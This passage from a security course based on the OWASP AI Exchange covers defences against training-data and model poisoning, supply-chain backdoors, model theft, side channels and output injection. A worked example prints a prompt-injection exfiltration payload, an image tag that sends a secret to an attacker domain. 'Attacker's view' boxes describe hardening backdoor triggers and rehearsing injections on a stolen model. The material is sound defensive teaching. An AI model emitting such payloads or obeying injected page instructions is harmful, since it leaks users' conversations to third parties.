Also weigh the accuracy tax: noise and smoothing degrade legitimate signal too, so keep the originals and titrate the distortion experimentally.

⚔ Attacker's view

My counterplay as a poisoner is robustness engineering on the trigger itself: make it large, low-frequency, or semantic (a real-world object rather than a pixel pattern) so it survives JPEG compression and Gaussian noise. Your experimentation problem is asymmetric — you test against the distortions you thought of; I design against the distortions I expect you to use. That is exactly why the guide warns that experiments "will not give conclusive results".

Six named techniques from the literature

The guide lists six research-grade examples in this control's family — spanning trigger-corruption, poisoned-sample removal, ensemble dilution, and post-hoc backdoor detection:

TechniqueMechanismWhere it acts
Transferability blocking (null labeling)The true defence against closed-box attacks is obstructing the transferability of adversarial samples — transferability lets adversarial samples work across different models trained on different datasets. Null labeling introduces null labels into the training dataset and trains the model to discard adversarial samples as null-labeled data.Training
DEFENSE-GANAttempts to "purify" images (adversarial attacks) by mapping them to the manifold of valid, unperturbed inputs — the perturbation is projected away before the model consumes the image.Input purification
Local Intrinsic Dimensionality (LID)Poisoned samples often exhibit distinct local characteristics — outliers, or lying in a subspace with abnormal properties — yielding anomalously high or low LID scores. Computing LID during training identifies and removes poisoned points, letting the model train robustly on clean data.Training (detection + removal)
(Weight) Bagging (ENISA 2021, Annex C)Train multiple models on different subsets of the training data, so the impact of poisoned samples is diluted across the ensemble; combining predictions reduces the influence of any single poisoned sample.Training (ensemble)
TRIM algorithm (ENISA 2021, Annex C)Iteratively trains a model while excluding data points that contribute disproportionately to the loss — these are likely outliers or poisoned samples. By minimizing loss on the remaining data, TRIM reduces the impact of maliciously crafted inputs.Training (iterative exclusion)
STRIP (after model evaluation; ENISA 2021, Annex C)Backdoor detection at inference: apply random perturbations to input samples and measure prediction entropy. Backdoored inputs show consistently low entropy — the trigger enforces a fixed output regardless of perturbation. Flagging anomalously low-entropy inputs identifies and mitigates backdoor influence during inference.Inference (post-evaluation)
▸ Worked example

Why does STRIP's entropy logic work? Take a clean image of a dog and blend random perturbations into it: the classifier's confidence wobbles across classes — high prediction entropy. Now take an image carrying a backdoor trigger: whatever you blend in, the trigger keeps forcing the attacker's target class — the output distribution barely moves, so entropy stays anomalously low. Consistently unshakeable predictions under perturbation are the tell of a trigger at work.

§ Source & standards

Guide pp. 232–235, permalink owaspai.org/go/traindatadistortion/. Bagging, TRIM and STRIP are documented in ENISA's 2021 report, Annex C. In MITRE ATLAS terms this family supports AML.M0007 Sanitize Training Data; the transferability discussion connects to ATLAS's craft-adversarial-data techniques (AML.T0043). NIST AI 100-2 treats the relevant attack class under §2.3.1 Availability Poisoning.

Your distorted training data is stored in a database an insider can write to. What protection does #TRAIN DATA DISTORTION give you against that insider?
None. The guide is explicit: the control has no effect against attackers with direct access to the training data after distortion — they inject poison post-transformation. Distortion only defends against poisoning that happened upstream of where it runs, which is why it should execute inside a trusted, separated training environment.
Removing an input field entirely is "data minimization" — why does the guide file it under train data distortion?
Because purpose defines the control. Technically it is data minimization (#DATA MINIMIZE), but here the goal is not protecting that field's confidentiality — it is destroying a channel the model could use to memorize poisoned samples. Same operation, different security objective.
STRIP is listed with the train-data controls but runs at inference. What does it actually detect, and how?
STRIP detects backdoored inputs at inference time (after model evaluation): it perturbs each input randomly and measures prediction entropy. A trigger forces a fixed output regardless of perturbation, so backdoored inputs show consistently low entropy and get flagged.

Key Points

  • #TRAIN DATA DISTORTION neutralizes backdoor triggers by degrading them — noise, smoothing, JPEG compression — so the model never learns the trigger→output binding.
  • Same idea as #INPUT DISTORTION (runtime, anti-evasion), applied to training data; #OBFUSCATE TRAINING DATA can serve privacy and poisoning mitigation simultaneously.
  • Field removal is a special form: data minimization in mechanism, memorization-reduction in purpose.
  • Pre-training only; keep original data and titrate distortion experimentally — results are never conclusive against a creative attacker.
  • Hard limit: useless against attackers who can write to the data after distortion; run it inside a trusted, separated training environment to cover upstream poisoning.
  • Six named techniques: null labeling (transferability blocking), DEFENSE-GAN purification, LID-based removal, (weight) bagging, TRIM iterative exclusion, STRIP entropy-based backdoor detection at inference (last three: ENISA 2021 Annex C).
  • Standards: not yet in ISO/IEC; OpenCRE → ETSI 5.2.2 Data sanitization, ENISA Table 5, NIST AI 100-2 §2.3.1.
Module 11 · §3.1.1–3.1.3 · OWASP AI Exchange

Healing and Hardening Models — and Poisoning Without Data

~15 minCovers guide pp. 235–239

What if the poison is already inside — or never came through the data at all? This lesson completes the poisoning picture: #POISON ROBUST MODEL heals an already-trained (even externally sourced) model through pruning, fine-tuning and Selective Amnesia; #TRAIN ADVERSARIAL hardens training against trigger-style poison; and two threats round out §3.1 — direct development-time model poisoning (attacking the model through the engineering environment) and supply-chain model poisoning (receiving a pre-poisoned model).

#POISON ROBUST MODEL — reduce the model's ability to recall poison

#POISON ROBUST MODELSelect model type and creation approach to reduce sensitivity to poisoned training datadevelopment-time · AI engineer control — post-training
IntentReduce sensitivity to poisoned training data by making sure the model does not memorize the specific malicious input pattern (the backdoor trigger). If the trigger is not memorized, presenting it at inference cannot invoke the attacker's chosen output.
ImplementTwo complementary strategies — combinable as fine pruning (see the paper on fine-pruning): (1) Pruning: reduce memorization by removing elements of memory. Pruning reduces the size of the model so it lacks the capacity to trigger on backdoor examples while retaining sufficient accuracy for the intended use case — it removes neurons in a neural network identified as non-essential for sufficient accuracy. (2) Fine-tuning on clean data: overwrite memorized malicious patterns by retraining on a clean (unpoisoned) dataset. A specific approach is Selective Amnesia (Zhu et al.) — a two-step continual-learning method: first induce forgetting by fine-tuning the compromised model on clean data with randomized labels, disrupting learned associations and erasing memory of both legitimate and malicious patterns (primary task and backdoor task alike); then restore primary functionality by fine-tuning on a small subset of correctly labeled clean data, recovering the intended task while drastically reducing the likelihood that backdoor triggers activate malicious behaviour.
LimitsPruning trades capacity for safety — prune too far and accuracy on the intended use case degrades. Fine-tuning approaches need clean data (though Selective Amnesia needs remarkably little — e.g. 0.1% of the original training data). Effectiveness numbers cited are benchmark results (MNIST), not universal guarantees.
StandardsNot covered yet in ISO/IEC standards. OpenCRE: Benign fine-tuning and pruning → ETSI §5.3.2 Fine-pruning; ENISA Table 5 "Integrate poisoning control after the 'model evaluation' phase"; NIST AI 100-2 §2.3.3 Backdoor Poisoning. Reference: 'Selective Amnesia: A Continual Learning Approach to Forgetting in Deep Neural Networks', Zhu et al. Permalink: owaspai.org/go/poisonrobustmodel/

Applicability is this control's superpower: it can be applied to a model that has already been trained — including models obtained from an external source. That makes it one of the very few technical defences available to you against supply-chain model poisoning (below), where every pre-training control was in someone else's hands.

Selective Amnesia — two-step backdoor removal (Zhu et al.)
Compromised modelbackdoor + primary task memorized
→
Fine-tune, randomized labelsclean data; erases primary AND backdoor tasks
→
Fine-tune, correct labelssmall clean subset, e.g. 0.1% of train data
→
Restored modelprimary task back, backdoor gone
▸ Worked example

The Selective Amnesia economics, per Zhu et al.: it needs only a small fraction of clean data (about 0.1% of the original training data) to effectively remove backdoor effects — practical even when clean data is scarce. It runs roughly 30× faster than training from scratch on the MNIST benchmark, with high fidelity in removing backdoor influence. And critically, it requires no prior knowledge of the backdoor trigger pattern — making it effective against unknown backdoor attacks. Compare that with trying to find the trigger first: you would be searching an effectively infinite input space for a pattern designed to be unguessable.

◆ Senior insight

Pruning and fine-tuning attack the same property — memorization — from opposite ends: pruning removes the capacity that stores the backdoor; fine-tuning overwrites its content. That is why fine pruning combines them: pruning first shrinks the parameter space where a backdoor can hide, then fine-tuning repairs accuracy and overwrites what survives. Adopting a third-party model without any post-training poison-robustness pass means trusting the supplier's entire training pipeline blindly — supply-chain attestations plus fine pruning is a defensible posture; attestations alone is hope.

#TRAIN ADVERSARIAL — generalization against trigger-style poison

#TRAIN ADVERSARIALTrain with adversarial examples — also useful against poison triggers based on slight alterationsdevelopment-time · AI engineer control — pre-training
IntentTraining with adversarial examples is primarily a control against evasion attacks, but it also helps against data-poison trigger attacks that are based on slight alterations of training data — because such triggers are like adversarial samples. It improves the model's generalization, reducing memorization of poisoned samples.
ImplementCovered in depth with the other controls against evasion attacks (see the evasion controls section of the guide). The poisoning-relevant case: an attacker adds images of stop signs to a self-driving car's training database, labeled as '35 miles an hour', where the stop sign is slightly altered. This forces the model to make a mistake on traffic signs altered in a similar way — and the slightness of the alteration is chosen to prevent anomaly detection of the poisoned samples.
LimitsHelps specifically against triggers that resemble adversarial perturbations (slight alterations); it is not a general anti-poisoning control. The research literature is explicitly divided — see 'Is Adversarial Training Really a Silver Bullet for Mitigating Data Poisoning?' — so treat it as one layer, validated empirically, never as the silver bullet.
StandardsOpenCRE: Adversarial training → ETSI §6.2.2 Adversarial training; ENISA Table 5 "Add some adversarial examples to the training dataset"; NIST AI 100-2 §2.2.4 Adversarial training. Papers: 'How to adversarially train against data poisoning'; 'Is Adversarial Training Really a Silver Bullet for Mitigating Data Poisoning?'. Permalink: owaspai.org/go/trainadversarial/
Why does Selective Amnesia randomize labels in step 1 instead of just fine-tuning on correctly labeled clean data?
Ordinary clean fine-tuning nudges the model but can leave deeply memorized backdoor associations intact. Randomized labels actively disrupt all learned associations — erasing both the primary task and the backdoor task. Step 2 then restores only the primary task from a small correctly-labeled subset; the backdoor, never retrained, stays forgotten.
Which anti-poisoning controls remain available for a model you downloaded already trained?
Only post-training controls: #POISON ROBUST MODEL (pruning, clean fine-tuning, fine pruning, Selective Amnesia) and adversarial robust distillation, plus #MODEL ENSEMBLE at deployment and #SUPPLY CHAIN MANAGE around acquisition. #MORE TRAIN DATA, #DATA QUALITY CONTROL, #TRAIN DATA DISTORTION and #TRAIN ADVERSARIAL all act before/during training you didn't perform.

Threat: direct development-time model poisoning (§3.1.2)

THREAT
Direct development-time model poisoningManipulating the model via the development environment — parameters, code, layers, serialization — not via training data. Lifecycle: development-time. Maps to: LLM04:2025, ATLAS ML Supply Chain / persistence techniques.

This threat manipulates model behaviour not by poisoning the training data, but by manipulating elements in the development environment that lead to the model or represent the model (i.e., model attributes). The guide's attack list:

  • Manipulating storage of model parameters;
  • Replacing the model with a completely different one with malicious behaviour;
  • Injection of malware (command or code injection) through custom or lambda layers;
  • Manipulating the model weights and modifying the model architecture;
  • Embedding deserialization attacks, which could execute stealthily during model unpacking or model execution.

Boundary definitions: when the model is trained by a supplier in a manipulative way and supplied as-is, that is supply-chain model poisoning (next section). Training-data manipulation is data poisoning. See the attack-surface diagram in lesson 1.

▸ Worked example

The deserialization vector is the one that bites real teams: Python's pickle format — historically used by common ML frameworks for model files — executes code during unpacking by design. A model file with an embedded payload compromises the loading machine before a single inference runs. This is why the ecosystem moved toward safer serialization (e.g., weights-only formats) and why MITRE ATLAS tracks unsafe ML artifacts (AML.T0010 ML Supply Chain Compromise, AML.T0018 Manipulate AI Model). The same logic applies to custom/lambda layers: they are executable code smuggled inside what looks like "just a model".

Controls: General controls (especially Limiting the effect of unwanted behaviour); the development-time protection controls — #DEV SECURITY to protect the development environment and primarily the model parameters, #SEGREGATE DATA, #CONF COMPUTE, #SUPPLY CHAIN MANAGE; and — new for this threat — model performance validation to detect deviation: #CONTINUOUS VALIDATION. A swapped or weight-edited model usually shifts observable performance; continuously validating against a reference suite catches the drift.

§ Source & standards

Guide pp. 237–238, permalink owaspai.org/go/devmodelpoison/.

Threat: supply-chain model poisoning (§3.1.3)

THREAT
Supply-chain model poisoningA third-party (pre-)trained model was manipulated at the source or in transit, then unknowingly used or fine-tuned. Lifecycle: development-time. Maps to: OWASP LLM03:2025 Supply Chain, ATLAS AML.T0010.

An attacker manipulates a third-party (pre-)trained model, which is then supplied, obtained, and unknowingly further used and/or trained or fine-tuned — while still carrying the unwanted behaviour. If the supplied model is used for further training, the attack is called a transfer learning attack: the poison survives your fine-tuning and transfers into your derivative model.

AI models are routinely obtained elsewhere (e.g., open source) and then further trained or fine-tuned. They may have been manipulated at the source or in transit. See OWASP for LLM 03: Supply Chain.

The manipulation can be done through data poisoning (the supplier's training data was poisoned) or by directly changing the model parameters. The same controls apply that help against those attacks — with one structural catch: protecting parameters at the moment they are manipulated is not in the hands of the party who obtained the model. What remains for you:

  • General controls, especially Limiting the effect of unwanted behaviour;
  • #SUPPLY CHAIN MANAGE to control where models come from — and especially also for components from frameworks and tools, which are supply-chain components that can themselves be poisoned;
  • Controls for data poisoning post-training: #POISON ROBUST MODEL to reduce the ability to recall poisoned data, and adversarial robust distillation to improve the generalization ability of the model;
  • Everything else must be applied by the supplier: development-time protection controls (e.g., protecting the training-set database against data poisoning) and the controls for broad model poisoning.
🛡 Defender's checklist
  • Source models only through governed channels (#SUPPLY CHAIN MANAGE): verified publishers, integrity-checked artifacts (ATLAS AML.M0014), AI-BOM entries (AML.M0023).
  • Assume any externally obtained model may carry a backdoor: run a #POISON ROBUST MODEL pass (fine pruning / Selective Amnesia) before production use.
  • Deploy as part of a #MODEL ENSEMBLE where feasible to contain a single poisoned member.
  • Extend supply-chain scrutiny to frameworks and tools — a poisoned training library poisons every model it builds.
  • Contractually push development-time protection obligations to the supplier; verify with attestations, but treat them as probabilistic (lesson 1).
  • Cap blast radius with the general "limit unwanted behaviour" controls — oversight, least privilege for model-driven actions.
§ Source & standards

Guide pp. 238–239, permalink owaspai.org/go/supplymodelpoison/. Canon: OWASP LLM03:2025 Supply Chain; MITRE ATLAS AML.T0010 ML Supply Chain Compromise. Real-world grounding: researchers have repeatedly demonstrated poisoned and backdoored models uploaded to public model hubs, and malicious pickle payloads in shared model files — the exact source-and-transit vectors this section describes.

You fine-tune a downloaded open-source model on your own clean data. Why might the backdoor still be there afterwards?
That is precisely the transfer learning attack: ordinary fine-tuning adjusts the model for your task but does not necessarily overwrite deeply memorized trigger associations, so the poison survives into your derivative model. Removing it takes deliberate post-training work — pruning, fine pruning, or Selective Amnesia-style forgetting — not incidental fine-tuning.

Key Points

  • #POISON ROBUST MODEL is post-training and works on externally obtained models: stop the model memorizing (or keep it recalling) the backdoor trigger.
  • Two strategies, combinable as fine pruning: pruning (remove non-essential neurons → no capacity to trigger) and clean-data fine-tuning (overwrite malicious patterns).
  • Selective Amnesia (Zhu et al.): forget everything via randomized-label fine-tuning, then restore the primary task from ~0.1% clean data; ~30× faster than retraining (MNIST); needs no knowledge of the trigger.
  • #TRAIN ADVERSARIAL helps against poison triggers built from slight alterations (they resemble adversarial samples) — e.g. subtly altered stop signs labeled '35 mph' — but the literature questions it as a universal fix.
  • Direct development-time model poisoning skips the data: parameter-storage tampering, model replacement, malware via custom/lambda layers, weight/architecture edits, embedded deserialization attacks. Add #CONTINUOUS VALIDATION to detect behavioural deviation.
  • Supply-chain model poisoning: poisoned at source or in transit; fine-tuning a poisoned base = transfer learning attack; your levers are supply-chain management (including frameworks/tools), post-training controls, and supplier obligations.
  • OWASP LLM03:2025 covers the supply-chain case; LLM04:2025 covers data and model poisoning.
Module 11 · §3.2 & §4 · OWASP AI Exchange

Development-Time Leaks and Runtime Conventional Threats

~18 minCovers guide pp. 240–249

Poisoning attacks integrity; this lesson covers the confidentiality side of development time — leaks of training data, model parameters, and source code — then crosses into chapter 4: conventional runtime attacks with AI-specific consequences. You'll learn why a stolen model is an attack multiplier, what side-channel attacks reveal without stealing anything, and the five runtime controls from #RUNTIME MODEL INTEGRITY to #ENCODE MODEL OUTPUT.

§3.2 Sensitive data leak development-time

THREAT
Sensitive data leak development-time (threat group)Unauthorized access to data, model or code assets held in the development environment. Lifecycle: development-time. Groups §3.2.1–3.2.3.

The development environment concentrates three asset classes an attacker wants: the training/test data, the model attributes, and the code/configuration that builds the model (permalink: owaspai.org/go/devleak/). Each gets its own threat:

ThreatWhat leaksImpactDistinctive controls
§3.2.1 Development-time data leakTrain/test dataConfidentiality breach of sensitive train/test data (personal data, IP)#DEV SECURITY, #SEGREGATE DATA, #CONF COMPUTE + Sensitive data limitation
§3.2.2 Direct development-time model leakModel attributes: parameters, weights, architectureIP theft and/or offline attack preparation on the copied modelSame + #SUPPLY CHAIN MANAGE, #MODEL WATERMARKING
§3.2.3 Source code/configuration leakPreprocessing/training code and configurationConfidentiality breach of model intellectual property#DEV SECURITY, #SEGREGATE DATA + Sensitive data limitation

§3.2.1 Development-time data leak

THREAT
Development-time data leakUnauthorized access to train or test data through a data leak of the development environment. Impact: confidentiality breach of sensitive train/test data.

Training data or test data can be confidential because it is sensitive (e.g., personal data) or intellectual property. An attack — or an unintended failure — can leak it. Training or test data theft means unauthorized access to exposure-restricted train/test data by stealing from the development environment, including the supply chain. Three exposure realities the guide highlights:

  • Leaking can happen from the development environment itself, because engineers need to work with real data to train the model.
  • Sometimes training data is collected at runtime, so a live system becomes an attack surface for this development-time threat.
  • GenAI models are often hosted in the cloud, sometimes managed by an external party — so if you train or fine-tune them, the training data (e.g., company documents) needs to travel to that cloud.

Controls: General controls — especially Sensitive data limitation (don't hold what you can't leak) — plus development-time protection: #DEV SECURITY (protecting primarily the training and test data), #SEGREGATE DATA, #CONF COMPUTE. Permalink: owaspai.org/go/devdataleak/.

§3.2.2 Direct development-time model leak

THREAT
Direct development-time model leakStealing model parameters/weights/architecture from the development environment — IP theft and an input-attack enabler.

Unauthorized access to model attributes (parameters, weights, architecture) by stealing data from the development environment, including the supply chain — via insider access, compromised repositories, or weak storage controls. The impact is double-edged:

  • Intellectual property theft (e.g., by a competitor); and/or
  • A way to perform input attacks on the copied model, circumventing protections — rate limiting, access control, and detection mechanisms don't exist on the attacker's own copy. This works for all input attacks that extract data, and for preparing evasion or prompt injection: experimenting offline to find attack inputs that work.

Risk identification: this threat applies if the model represents intellectual property (a trade secret), or if the risk of any input attack applies — with one exception: if the model is publicly available, there is no need to steal it. Alternative theft routes exist: model exfiltration (stealing through normal use, over many queries) and direct runtime model leak (below).

Controls: General controls (especially Sensitive data limitation); #DEV SECURITY (primarily the model parameters), #SEGREGATE DATA, #CONF COMPUTE, #SUPPLY CHAIN MANAGE (specifically protects model attributes); and specifically for model theft: #MODEL WATERMARKING — so a stolen copy can be proven yours. Permalink: owaspai.org/go/devmodelleak/.

⚔ Attacker's view

A stolen model is my attack lab. Against your API I get rate limits, anomaly detection and logging; against my local copy I get unlimited, silent queries. I can gradient-search for evasion inputs, rehearse prompt injections, and tune data-extraction attacks until they work — then fire the finished attack at your production system in a handful of clean-looking requests. That is why the guide rates model confidentiality as more than IP protection: it is the shield around all your other runtime defences.

§3.2.3 Source code/configuration leak

THREAT
Source code/configuration leakUnauthorized access to code/configuration that leads to the model. Impact: confidentiality breach of model IP.

Unauthorized access to code or configuration that leads to the model, through a data leak of the development environment. Such code or configuration is used to preprocess the training/test data and train the model — for many organizations, the preprocessing pipeline and training recipe embody as much competitive advantage as the weights. Controls: General controls (especially Sensitive data limitation); #DEV SECURITY (primarily the source code/configuration), #SEGREGATE DATA. Permalink: owaspai.org/go/devcodeleak/.

Your model's weights are already public on a model hub. Does the development-time model leak threat still apply to you?
No — the guide's risk identification says the threat applies when the model is IP or when input-attack risk applies, except when the model is publicly available, because then there is nothing to steal. Your risk register should reflect that: controls like #MODEL WATERMARKING for theft detection stop paying rent.

§4 Runtime conventional security threats

THREAT
Runtime conventional security threats (group)Conventional attacks on the live system with AI-specific consequences. Lifecycle: runtime. Permalink: owaspai.org/go/runtimeconventionalsec/.

An AI system is an IT system — at runtime it is vulnerable to any security attack, for example breaking into the application's user database. Those conventional attacks and countermeasures are covered by many other resources; the guide focuses on what is AI-specific. Orientation: Section 2 of the guide covers runtime AI-specific attacks performed through inference (using the system, providing model input); Section 3 covers development-time attacks — mostly conventional (e.g., breaking into a training database) with sometimes AI-specific consequences, plus AI-specific supply-chain attacks. This chapter covers conventional runtime attacks with AI-specific consequences — for example, changing model behaviour by hacking into a runtime database of augmentation data (data added to model input). Coverage focuses on AI-specific aspects of controls, such as using a Trusted Execution Environment for models. The subsections: non-AI-specific threats, model poisoning, model leak, insecure output handling, leaking input data, and attacks on augmentation data.

§4.1 Generic security threats

THREAT
Generic security threatsNon-AI-specific weaknesses (e.g., SQL injection) — can impact confidentiality, integrity and availability of all assets.

AI systems can carry classic vulnerabilities such as SQL injection; those are covered in depth by other sources and out of scope for the guide. Note: some controls in the guide are conventional security controls applied to AI-specific threats (e.g., monitoring to detect model attacks). Controls (permalink: owaspai.org/go/genericsecthreats/):

  • Governance controls in the general section — in particular #SEC DEV PROGRAM to attain application security, and #SEC PROGRAM to attain information security in the organization.
  • Technical conventional security controls. Useful standards: OpenCRE on technical conventional security controls; the ISO 27002 controls only partly cover these, and at a high abstraction level; more detailed and comprehensive overviews live in Common Criteria protection profiles (ISO/IEC 15408, with evaluation described in ISO 18045) — or in OWASP ASVS.
  • Operational security. When models are hosted by third parties, security configuration of those services deserves special attention. Part of that configuration is model access control — an important mitigation for security risks. Cloud AI configuration options deserve scrutiny — for example, opting out (when necessary) of monitoring by the third party, which could otherwise increase the risk of exposing sensitive data. Standards: OpenCRE on operational security processes; ISO 27002 again only partial and high-level.
⚠ Common misconception

"The cloud provider's default telemetry is harmless." The guide flags the opposite: third-party monitoring of your hosted model can itself become a sensitive-data exposure channel — your prompts and outputs flow into someone else's logs. Reviewing (and where needed opting out of) provider monitoring is an operational-security control, not paranoia.

§4.2 Direct runtime model poisoning

THREAT
Direct runtime model poisoningAltering model parameters within the live system, or compromising model input/output logic — changing behaviour or denying service. Impact: see broad model poisoning.

This threat manipulates model behaviour by altering the parameters within the live system itself. Those parameters represent the regularities extracted during training — such as neural network weights. Alternatively, compromising the model's input or output logic can also change its behaviour or deny its service. Controls: the General controls, plus two dedicated ones (permalink: owaspai.org/go/runtimemodelpoison/):

#RUNTIME MODEL INTEGRITYConventional protection of model-parameter storage at runtimeruntime · information security control against conventional threats
IntentStop attackers modifying the deployed model's parameters in the production environment — the runtime counterpart of protecting weights at development time.
ImplementApply traditional conventional security controls to protect the storage of model parameters: access control, checksums, encryption. A Trusted Execution Environment can help to protect model integrity.
LimitsProtects the stored parameters, not the surrounding I/O path — pair with #RUNTIME MODEL IO INTEGRITY. TEEs impose hardware/platform constraints.
StandardsPermalink: owaspai.org/go/runtimemodelintegrity/
#RUNTIME MODEL IO INTEGRITYProtect the model's input/output logic from runtime manipulationruntime · information security control against conventional threats
IntentPrevent attackers from tampering with what goes into or comes out of the model at runtime — behaviour change or denial of service without touching a single weight.
ImplementApply conventional security controls to protect against runtime manipulation of the model's input/output logic — e.g., protect against a man-in-the-middle attack on the inference path.
LimitsCovers transport/logic integrity of the I/O path; does not address adversarial content of legitimate inputs (that is the evasion/prompt-injection domain).
StandardsPermalink: owaspai.org/go/runtimemodeliointegrity/

§4.3 Direct runtime model leak

THREAT
Direct runtime model leakStealing model parameters from the live system — executables, memory, storage — or leaking internals via side channels. Impact: IP theft + offline attack preparation.

Stealing model parameters from a live system by breaking into it — gaining access to executables, memory, or other storage/transfer of parameter data in the production environment. The word 'direct' distinguishes it from model exfiltration, which steals a model through a number of steps of normal use; it also differs from the direct development-time model leak in lifecycle and attack surface. The impact matches §3.2.2: IP theft, and/or performing input attacks on the copied model while circumventing rate limiting, access control and detection — for all data-extracting input attacks and for preparing evasion or prompt injection. The same risk identification applies too: relevant if the model is a trade secret or input-attack risk exists, unless the model is public.

This threat also includes side-channel attacks: attackers do not necessarily steal the entire model, but extract specific details about its behaviour or internal state by observing characteristics like response times, power consumption, or electromagnetic emissions during inference. That can reveal the model's structure, the type of data it processes, or even specific parameter values — leverage for subsequent attacks or for replicating the model.

Controls: General controls (especially Sensitive data limitation), #MODEL WATERMARKING, plus (permalink: owaspai.org/go/runtimemodelleak/):

#RUNTIME MODEL CONFIDENTIALITYProtect runtime storage of model parameters; TEE against side channelsruntime · information security control against conventional threats
IntentKeep the deployed model's parameters confidential in production — denying attackers both the IP and the offline attack lab.
ImplementSee #SEC DEV PROGRAM for conventional security, focused on protecting parameter storage (access control, encryption). A Trusted Execution Environment (TEE) can be highly effective: it isolates model operations in a secure enclave, reducing risk from threats including side-channel hardware attacks like DeepSniffer. Side-channel mitigation techniques: Masking — introduce random delays or noise during inference to obscure the relationship between input data and response times, complicating timing-based side channels (see 'Masking against Side-Channel Attacks: A Formal Security Proof'); Shielding — hardware-based shielding to prevent electromagnetic or acoustic leakage (see 'Electromagnetic Shielding for Side-Channel Attack Countermeasures').
LimitsDoes not stop model exfiltration through normal use (that is a separate threat with its own controls); masking adds latency/noise costs; shielding is a hardware measure with deployment constraints.
StandardsPermalink: owaspai.org/go/runtimemodelconfidentiality/
#MODEL OBFUSCATIONStore the model in a complex, minimally informative formruntime · information security control against conventional threats
IntentRaise the cost of the last step of a model theft: even after gaining access to runtime storage, the attacker must still extract and understand the model.
ImplementTechniques to store the model in a complex and confusing way with minimal technical information — see the article on ModelObfuscator.
LimitsObfuscation is friction, not prevention — a defence-in-depth layer behind access control and encryption, not a substitute for them.
StandardsPermalink: owaspai.org/go/modelobfuscation/

§4.4 Output contains conventional injection

THREAT
Output contains conventional injectionModel output carries payloads like XSS that fire when processed — including data exfiltration via output. Maps to: LLM05:2025 Improper Output Handling, ATLAS AML.T0051.

Textual model output may contain conventional injection attacks such as XSS (cross-site scripting), which creates a vulnerability when the output is processed — e.g., shown on a website, or used to execute a command. This is like the standard output-encoding issue; the particularity is that AI output may include such attacks. Two special forms:

  • Exfiltration via executed output: the model is manipulated to output JavaScript code that is executed and sends sensitive data to a third party.
  • Exfiltration via URLs in output: sensitive data is packed into URLs in the output — for users to click on, or images to retrieve. By classic definitions this is not injection, but the spirit of the mechanism is, so the guide keeps it in scope: the data gets 'executed' by a web (HTTP) request, either when a browser renders an image or when a user clicks a link.
▸ Worked example

Chain this with prompt injection and you get the canonical GenAI exfiltration: a poisoned web page tells your RAG assistant to append the user's conversation, URL-encoded, to an image URL under the attacker's domain — <img src="https://evil.example/x.png?d=SECRET">. The user's browser dutifully fetches the "image", delivering the secret. No script executed, nothing clicked — rendering was enough. This pattern has been demonstrated repeatedly against production LLM assistants, and output encoding/sanitization of URLs is the choke point that kills it.

#ENCODE MODEL OUTPUTOutput-encode textual model outputruntime · information security control against conventional threats
IntentNeutralize injection payloads in model output before any downstream component (browser, shell, interpreter) can execute them — treat model output as untrusted data, exactly like user input.
ImplementApply output encoding on model output if it's text. See OpenCRE on output encoding and injection prevention.
LimitsEncoding must match the output context (HTML, URL, shell); the URL-exfiltration variant additionally needs handling of links/images in output, since a syntactically benign URL can still carry stolen data.
StandardsOpenCRE: Model output contains conventional injection → OWASP Top 10 for LLM LLM05:2025 Improper Output Handling; MITRE ATLAS AML.T0051 LLM Prompt Injection. See OWASP for LLM 05. Permalink: owaspai.org/go/encodemodeloutput/

§4.5 Input data leak

THREAT
Input data leakConfidentiality breach of sensitive input data (e.g., GenAI prompts) at rest or in transit, via attack or failure.

Input data — e.g., GenAI prompts — can be sensitive, and can leak either through a failure or through an attack such as a man-in-the-middle attack on data at rest or in transit. The guide lists complicating factors; the first is metadata: if metadata accompanies the input (e.g., identifying a user), risk increases — for example when a sensitive conversation in prompts is linked to the user. (Further complicating factors continue in the guide beyond this module's page range; permalink: owaspai.org/go/inputdataleak/.)

◆ Senior insight

Notice the symmetry the guide builds across §3.2 and §4: the same three assets — data, model, code/logic — are attacked for confidentiality at development time (§3.2.1–3.2.3) and again at runtime (§4.3, §4.5), and for integrity at both lifecycles (§3.1 vs §4.2). When you threat-model an AI system, run that 3×2×2 grid (asset × lifecycle × C/I) and you will not miss a category. The controls differ per cell — #DEV SECURITY at development time, TEEs and access control at runtime — but the asset inventory is constant.

What distinguishes direct runtime model leak, direct development-time model leak, and model exfiltration?
All three steal the model, but by different routes: direct runtime model leak breaks into the live system (executables, memory, production storage); direct development-time model leak steals from the development environment (insiders, compromised repos, weak storage); model exfiltration reconstructs the model through normal use over many queries. Lifecycle and attack surface differ, so the controls differ.
Why is packing sensitive data into an output URL treated as an injection threat when classically it isn't injection?
Because the mechanism's spirit is identical: attacker-influenced output gets 'executed' by a downstream processor — here, an HTTP request fired when a browser renders an image or a user clicks a link. The guide scopes it under output-contains-injection so that the same control point (#ENCODE MODEL OUTPUT and output handling) addresses it.
How can an attacker learn about your model without stealing any files from the server?
Side-channel attacks: observing response times, power consumption, or electromagnetic emissions during inference to infer model structure, the type of data processed, or even parameter values. Mitigations: run inference in a TEE (effective even against hardware side-channel attacks like DeepSniffer), mask timing with random delays/noise, and shield hardware against electromagnetic/acoustic leakage.

Key Points

  • §3.2 groups three development-time confidentiality threats: data leak (3.2.1), model leak (3.2.2), source code/configuration leak (3.2.3) — all mitigated by Sensitive data limitation, #DEV SECURITY, #SEGREGATE DATA (+ #CONF COMPUTE, #SUPPLY CHAIN MANAGE, #MODEL WATERMARKING where relevant).
  • A leaked model enables offline preparation of all input attacks, bypassing rate limits, access control and detection — unless the model is public, in which case the theft threat doesn't apply.
  • Cloud training/fine-tuning means training data travels to third-party infrastructure; runtime-collected training data makes the live system part of the development attack surface.
  • §4 = conventional runtime attacks with AI-specific consequences; generic threats are handled by #SEC DEV PROGRAM / #SEC PROGRAM, OWASP ASVS, ISO/IEC 15408 + ISO 18045, and operational security including model access control and scrutiny of cloud monitoring.
  • Direct runtime model poisoning (parameters or I/O logic in the live system) → #RUNTIME MODEL INTEGRITY (access control, checksums, encryption, TEE) + #RUNTIME MODEL IO INTEGRITY (e.g., anti-MitM).
  • Direct runtime model leak includes side channels (timing, power, EM); counter with #RUNTIME MODEL CONFIDENTIALITY (TEE vs DeepSniffer, masking, shielding), #MODEL OBFUSCATION, #MODEL WATERMARKING.
  • Model output is untrusted: XSS and data exfiltration via scripts or URLs in output → #ENCODE MODEL OUTPUT (LLM05:2025).
  • Input data (prompts) leaks are conventional C-breaches; metadata linking conversations to users amplifies the impact.
Module 12 · §4–4.1 · OWASP AI Exchange

AI Systems Are IT Systems: Runtime Conventional Threats

~12 minCovers guide pp. 243–244

